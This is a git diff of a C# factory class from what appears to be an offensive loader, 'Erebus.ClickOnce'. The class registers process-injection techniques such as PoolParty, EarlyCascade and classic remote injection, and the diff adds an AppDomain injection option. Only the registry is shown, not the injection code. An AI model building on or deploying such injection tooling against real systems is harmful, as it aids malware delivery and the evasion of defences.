@@ -1,6 +1,4 @@
 using Erebus.ClickOnce.Injections;
-using System;
-using System.Collections.Generic;
 using System.Runtime.Versioning;
 
 namespace Erebus.ClickOnce
@@ -14,13 +12,14 @@ namespace Erebus.ClickOnce
             { "earlycascade", () => new EarlyCascadeInjection() },
             { "poolparty", () => new PoolPartyInjection() },
             { "classic", () => new ClassicRemoteInjection() },
-            { "enumdesktops", () => new EnumDesktopsInjection() }
+            { "enumdesktops", () => new EnumDesktopsInjection() },
+            { "appdomain", () => new AppDomainInjection() }
         };
 
         public static IInjectionMethod GetInjectionMethod(string methodName)
         {
             var key = methodName.ToLower().Replace(" ", "").Replace("-", "");
-            
+
             if (_injectionMethods.TryGetValue(key, out var factory))
             {
                 return factory();
@@ -33,7 +32,7 @@ namespace Erebus.ClickOnce
         {
             DebugLogger.WriteLine("\n[*] Available Injection Methods:");
             DebugLogger.WriteLine("================================");
-            
+
             foreach (var kvp in _injectionMethods)
             {
                 var method = kvp.Value();
@@ -41,7 +40,7 @@ namespace Erebus.ClickOnce
                 DebugLogger.WriteLine($"  Name: {method.Name}");
                 DebugLogger.WriteLine($"  Description: {method.Description}");
             }
-            
+
             DebugLogger.WriteLine("\n================================\n");
         }
 
